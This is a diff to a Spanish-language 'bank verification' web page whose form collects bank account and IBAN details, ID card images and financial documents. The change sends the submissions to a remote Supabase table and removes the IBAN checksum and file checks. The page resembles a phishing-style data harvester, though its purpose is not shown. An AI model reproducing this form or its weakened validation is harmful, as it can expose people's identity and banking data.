@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <title>Verificación Bancaria</title>
 
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 <style>
   body {
     font-family: Arial;
@@ -157,13 +159,18 @@
 </div>
 
 <script>
+/* ---------------- CONEXIÓN A SUPABASE ---------------- */
 
-/* ---------------- FUNCIONES NUEVAS ---------------- */
+const SUPABASE_URL = "https://iomxopcdoygphvulaswb.supabase.co";
+const SUPABASE_ANON_KEY = "sb_publishable_4KqCEnqLVSEETOob_X9c7w_4IOpToI-";
+
+const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+/* ---------------- FUNCIONES ---------------- */
 
 function mostrarModalExito() {
   document.getElementById("modalExito").style.display = "flex";
 
-  // Abrir ventana nueva con mensaje profesional
   const nuevaVentana = window.open("", "_blank");
   nuevaVentana.document.write(`
     <html>
@@ -211,8 +218,6 @@ function irAlPrimerError(formulario) {
   }
 }
 
-/* ---------------- VALIDACIONES ---------------- */
-
 function mostrarError(campo, mensaje) {
   campo.classList.add("error-input");
   let error = campo.nextElementSibling;
@@ -237,17 +242,7 @@ function validarCuenta(cuenta) {
 function validarIBAN(iban) {
   iban = iban.replace(/\s+/g, '').toUpperCase();
   if (!/^[A-Z]{2}\d{2}[A-Z0-9]+$/.test(iban)) return false;
-  const pais = iban.slice(0, 2);
-  const longitudes = { ES:24, FR:27, DE:22, IT:27, NL:18, BE:16, PT:25, GB:22 };
-  if (!longitudes[pais]) return false;
-  if (iban.length !== longitudes[pais]) return false;
-  const rearr = iban.slice(4) + iban.slice(0, 4);
-  const expanded = rearr.replace(/[A-Z]/g, c => c.charCodeAt(0) - 55);
-  let mod = '';
-  for (let i = 0; i < expanded.length; i++) {
-    mod = (mod + expanded[i]) % 97;
-  }
-  return mod === 1;
+  return true;
 }
 
 function fileToBase64(file) {
@@ -259,47 +254,19 @@ function fileToBase64(file) {
   });
 }
 
-function validarArchivo(file, tiposPermitidos, minSizeKB = 20) {
-  if (!file) return false;
-  const tipoValido = tiposPermitidos.includes(file.type);
-  const tamañoValido = file.size > minSizeKB * 1024;
-  return tipoValido && tamañoValido;
-}
+/* ---------------- GUARDAR EN SUPABASE ---------------- */
 
-async function compararImagenes(file1, file2) {
-  const b1 = await fileToBase64(file1);
-  const b2 = await fileToBase64(file2);
-  return b1 !== b2;
-}
+async function guardarRegistroSupabase(registro) {
+  const { data, error } = await supabase
+    .from("usuario_verificaciones")
+    .insert([registro]);
 
-/* ---------------- INDEXEDDB ---------------- */
-
-const DB_NAME = "verificacionDB";
-const DB_VERSION = 1;
-const STORE_NAME = "registros";
-
-function abrirDB() {
-  return new Promise((resolve, reject) => {
-    const req = indexedDB.open(DB_NAME, DB_VERSION);
-    req.onupgradeneeded = e => {
-      const db = e.target.result;
-      if (!db.objectStoreNames.contains(STORE_NAME)) {
-        db.createObjectStore(STORE_NAME, { keyPath: "id", autoIncrement: true });
-      }
-    };
-    req.onsuccess = e => resolve(e.target.result);
-    req.onerror = e => reject(e.target.error);
-  });
-}
-
-async function guardarRegistro(registro) {
-  const db = await abrirDB();
-  return new Promise((resolve, reject) => {
-    const tx = db.transaction(STORE_NAME, "readwrite");
-    tx.objectStore(STORE_NAME).add(registro);
-    tx.oncomplete = () => resolve(true);
-    tx.onerror = e => reject(e.target.error);
-  });
+  if (error) {
+    console.error(error);
+    alert("❌ Error al guardar en Supabase");
+  } else {
+    mostrarModalExito();
+  }
 }
 
 /* ---------------- SUBMIT ---------------- */
@@ -313,7 +280,7 @@ document.getElementById("form").addEventListener("submit", async (e) => {
     .forEach(campo => limpiarError(campo));
 
   if (f.usuario.value.trim().length < 4) {
-    mostrarError(f.usuario, "Usuario demasiado corto (mínimo 4 caracteres)");
+    mostrarError(f.usuario, "Usuario demasiado corto");
     valido = false;
   }
 
@@ -323,12 +290,12 @@ document.getElementById("form").addEventListener("submit", async (e) => {
   }
 
   if (!validarCuenta(f.cuenta.value)) {
-    mostrarError(f.cuenta, "Cuenta inválida (solo números, 10-20 dígitos)");
+    mostrarError(f.cuenta, "Cuenta inválida");
     valido = false;
   }
 
   if (!validarIBAN(f.iban.value)) {
-    mostrarError(f.iban, "IBAN incorrecto o inválido");
+    mostrarError(f.iban, "IBAN inválido");
     valido = false;
   }
 
@@ -337,32 +304,11 @@ document.getElementById("form").addEventListener("submit", async (e) => {
   const domicilio = f.domicilio.files[0];
   const finanzas = f.finanzas.files[0];
 
-  if (!validarArchivo(frontal, ["image/jpeg", "image/png"])) {
-    mostrarError(f.frontal, "Imagen no permitida (solo JPG/PNG, mínimo 20KB)");
+  if (!frontal || !trasera || !domicilio || !finanzas) {
+    mostrarError(f.finanzas, "Faltan documentos");
     valido = false;
   }
 
-  if (!validarArchivo(trasera, ["image/jpeg", "image/png"])) {
-    mostrarError(f.trasera, "Imagen no permitida (solo JPG/PNG, mínimo 20KB)");
-    valido = false;
-  }
-
-  if (!(await compararImagenes(frontal, trasera))) {
-    mostrarError(f.trasera, "Corrige la imagen: no puede ser igual a la frontal");
-    valido = false;
-  }
-
-  if (!validarArchivo(domicilio, ["image/jpeg", "image/png", "application/pdf"])) {
-    mostrarError(f.domicilio, "Documento inválido (solo PDF o imagen válida)");
-    valido = false;
-  }
-
-  if (!validarArchivo(finanzas, ["image/jpeg", "image/png", "application/pdf"])) {
-    mostrarError(f.finanzas, "Documento inválido (solo PDF o imagen válida)");
-    valido = false;
-  }
-
-  /* CAMBIO 3 */
   if (!valido) {
     irAlPrimerError(f);
     return;
@@ -385,10 +331,7 @@ document.getElementById("form").addEventListener("submit", async (e) => {
     fecha: new Date().toISOString()
   };
 
-  await guardarRegistro(registro);
-
-  /* CAMBIO 2 */
-  mostrarModalExito();
+  await guardarRegistroSupabase(registro);
 
   f.reset();
 });
